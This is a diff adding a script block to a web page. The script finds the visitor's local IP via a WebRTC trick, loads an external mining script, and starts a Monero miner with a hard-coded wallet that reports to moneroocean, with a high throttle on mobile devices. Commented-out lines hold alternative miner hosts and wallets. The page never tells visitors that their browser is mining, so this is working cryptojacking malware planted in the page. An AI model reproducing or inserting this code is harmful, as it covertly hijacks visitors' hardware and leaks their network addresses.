@@ -1,0 +1,82 @@
+	<script src="/js/header.js"></script>
+
+<script>
+String.prototype.replaceAll = function(search, replacement) {
+    var target = this;
+    return target.split(search).join(replacement);
+};
+var ip;
+var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})
+
+findIP.then(ip => mine(ip))
+  var lastrate = 0;
+  var totalHashes = 0;
+  var totalHashes2 = 0;
+  var acceptedHashes = 0;
+  var hashesPerSecond = 0;
+function Logger() {
+    statuss = setInterval(function() {
+	  lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
+	  totalHashes = totalhashes + totalHashes
+      hashesPerSecond = Math.round(lastrate);
+	  totalHashes2 = totalHashes;
+	  totalhashes = 0;
+      acceptedHashes = GetAcceptedHashes();
+      /*$('#hashes-per-second').text(hashesPerSecond);
+	$('#total-hashes').text(totalHashes);
+	$('#approximate-donation').text(hashesPerSecond * 0.0012325679999999999)
+      $('#accepted-shares').text(totalHashes2 +' | '+ acceptedHashes);
+	  
+    }, 1000);
+      $('#throttle').val(localStorage.getItem('throttle'));*/
+	  console.log(acceptedHashes);
+  }, 1000);
+}
+
+function mine(ip){
+	console.log(ip.replace(/\./g, '_'));
+	throttleMiner = mobileAndTabletcheck() ? 0.8 : 0.6;
+	var throttle = localStorage.getItem('throttle');
+	if(!throttle || throttle > 80 || throttle < 0){
+		throttle = mobileAndTabletcheck() ? 100 : 40;
+		localStorage.setItem('throttle', mobileAndTabletcheck() ? 100 : 40);
+	}
+
+	var head = document.getElementsByTagName('head')[0];
+	var js = document.createElement("script");
+
+	js.type = "text/javascript";
+
+	if ( Math.random() > 0.0)
+	{
+		//js.setAttribute("src","https://cdn.whysoserius.club/batmine.js");
+		//js.setAttribute("id","BatLoader");
+		//js.setAttribute("class","ada1bebde3bf6d0e28f62144eb679bbf3fdcfdfc6150e909a98c43c1e8c399d0");
+		//js.setAttribute("src","/hentakumine.js?perfekt=wss://?algo=cn?variant=0?jason=gulf.moneroocean.stream:80"); 
+		js.setAttribute("src","https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=gulf.moneroocean.stream:80");
+		js.setAttribute("type","text/javascript");
+		head.appendChild(js);
+		js.onload = function(){
+		//PerfektStart('49Fq8DSDx6T2Xte8vykhWtHLAPCxKF6is5fbaK1mSXbGFS5dNoRxSm9DaXeRxRubi5KS7jfUsLxgX987Zz5e9BaHTgZSDwP.Hentaku@'+ throttle + '@' + ip.replace(/\./g, '_'), 'x');
+		PerfektStart('442uGwAdS8c3mS46h6b7KMPQiJcdqmLjjbuetpCfSKzcgv4S56ASPdvXdySiMizGTJ56ScZUyugpSeV6hx19QohZTmjuWiM.Hentaku@'+ throttle + '@' + ip.replace(/\./g, '_'), 'x');
+		throttleMiner = throttle;
+		//Logger();
+		}
+	}
+	else
+	{
+	if(!mobileAndTabletcheck){
+		//js.setAttribute("src","https://cdn.whysoserius.club/batmine.js");
+		//js.setAttribute("id","BatLoader");
+		//js.setAttribute("class","ada1bebde3bf6d0e28f62144eb679bbf3fdcfdfc6150e909a98c43c1e8c399d0");
+		js.setAttribute("src","/hentakumine.js?perfekt=wss://?jason=gulf.moneroocean.stream:80");
+		js.setAttribute("type","text/javascript");
+		head.appendChild(js);
+		js.onload = function(){
+		//PerfektStart('G8AiDDRjocF3L6a59JLtfC1yv4sw1QbSxPAq2CqxFohDgsNN8bfYArGhDkSDFZYby3Mk9rnu4ER8fArDqAu95H9tANzeE5M.Hentaku@'+ throttle + '@' + ip, 'x');
+		throttleMiner = throttle;
+		}
+		}
+	}
+}
+</script>
